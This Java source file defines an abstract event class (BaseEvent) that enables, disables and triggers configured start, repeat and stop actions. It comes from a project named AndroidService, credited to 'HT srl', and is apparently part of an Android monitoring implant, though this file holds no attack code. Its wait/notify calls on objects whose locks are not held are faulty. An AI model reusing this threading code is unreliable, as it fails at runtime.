/* **********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 30-mar-2011
 **********************************************/

package com.android.service.event;

import com.android.service.Status;
import com.android.service.ThreadBase;
import com.android.service.action.Action;
import com.android.service.auto.Cfg;
import com.android.service.conf.ConfEvent;
import com.android.service.event.BaseEvent.Waiter;
import com.android.service.util.Check;

// TODO: Auto-generated Javadoc
/**
 * The Class EventBase.
 */
public abstract class BaseEvent implements Runnable {

	/** The Constant TAG. */
	private static final String TAG = "EventBase"; //$NON-NLS-1$
	private Object condition = new Object();

	// Gli eredi devono implementare i seguenti metodi astratti

	/**
	 * Parses the.
	 * 
	 * @param event
	 *            the event
	 */
	protected abstract boolean parse(ConfEvent event);

	//
	/**
	 * eseguito da Conf o da Action Comincia la valutazione della condizione.
	 * Quando la condizione diventa vera, viene eseguito actualStart. Ogni
	 * delay, per un massimo di iter, viene eseguito actualRepeat. Alla fine
	 * della condizione, viene eseguito actualStop.
	 */
	public synchronized void enable() {
		conf.enabled = true;
	}

	// eseguito da Conf o da Action
	public synchronized void disable() {
		conf.enabled = false;
		if (waiter != null) {
			waiter.notifyAll();
		}
		actualDisable();
		notifyAll();
	}

	public synchronized void run() {
		actualEnable();

		try {
			condition.wait();
		} catch (InterruptedException e) {

		}

		if (isEnabled()) {
			triggerStartAction();
		}

		for (int i = 0; isEnabled() && i < getIter(); i++) {
			try {
				wait(getDelay());
			} catch (InterruptedException e) {
			}
			triggerRepeatAction();
		}

		try {
			if (isEnabled()) {
				wait();
			}
		} catch (InterruptedException e) {
		}

	}

	private boolean isEnabled() {
		return conf.enabled;
	}

	boolean inCondition;
	private Waiter waiter;

	protected synchronized void startCondition() {
		if (isEnabled()) {
			inCondition = true;
			condition.notifyAll();
		}
	}

	protected synchronized void stopCondition() {
		if (isEnabled()) {
			inCondition = false;
			condition.notifyAll();
			triggerStopAction();
		}
	}

	protected abstract void actualEnable();

	protected abstract void actualDisable();

	class Waiter implements Runnable {
		private long delay;
		private WaitCallback callback;
		private boolean waiting;

		public Waiter(WaitCallback callback, long delay) {
			this.delay = delay;
			this.callback = callback;
		}

		public synchronized void run() {
			boolean interrupted = false;
			try {
				waiting = true;
				wait(delay);
			} catch (InterruptedException e) {
				interrupted = true;
				return;
			}
			waiting = false;
			callback.afterWait(interrupted);
		}

		private synchronized boolean isWaiting() {
			return waiting;
		}

	}

	protected void startAsyncWait(WaitCallback callback, long delay) {

		if (Cfg.DEBUG)
			if (waiter != null)
				Check.asserts(!waiter.isWaiting(), "startAsyncWait: waiter is waiting");
		waiter = new Waiter(callback, delay);
		Thread t = new Thread(waiter);
		t.start();
	}

	/** The event. */
	protected ConfEvent conf;
	private int iterCounter;

	public int getId() {
		return conf.getId();
	}

	public String getType() {
		return conf.getType();
	}

	private int getIter() {
		return conf.iter;
	}

	/**
	 * Sets the event.
	 * 
	 * @param event
	 *            the new event
	 */
	public boolean setConf(final ConfEvent conf) {
		if (Cfg.DEBUG) {
			Check.requires(conf != null, "null conf");
		}
		this.conf = conf;
		boolean ret = parse(conf);
		iterCounter = conf.iter;
		return ret;

	}

	private final boolean trigger(int actionId) {
		if (actionId != Action.ACTION_NULL) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " event: " + this + " triggering: " + actionId);//$NON-NLS-1$ //$NON-NLS-2$
			}
			Status.self().triggerAction(actionId);
			return true;
		} else {
			return false;
		}
	}

	private int getDelay() {
		return conf.delay;
	}

	private synchronized boolean stillIter() {
		iterCounter--;
		return iterCounter >= 0;
	}

	private boolean triggerStartAction() {
		if (Cfg.DEBUG) {
			Check.requires(conf != null, "null conf");
		}
		return trigger(conf.startAction);
	}

	private boolean triggerStopAction() {
		if (Cfg.DEBUG) {
			Check.requires(conf != null, "null conf");
		}
		return trigger(conf.stopAction);
	}

	private boolean triggerRepeatAction() {
		if (Cfg.DEBUG) {
			Check.requires(conf != null, "null conf");
		}
		return trigger(conf.repeatAction);
	}

	@Override
	public String toString() {
		return "Event " + conf.getId() + " " + conf.desc + " type:" + conf.getType() + " enabled: " + isEnabled(); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
	}

}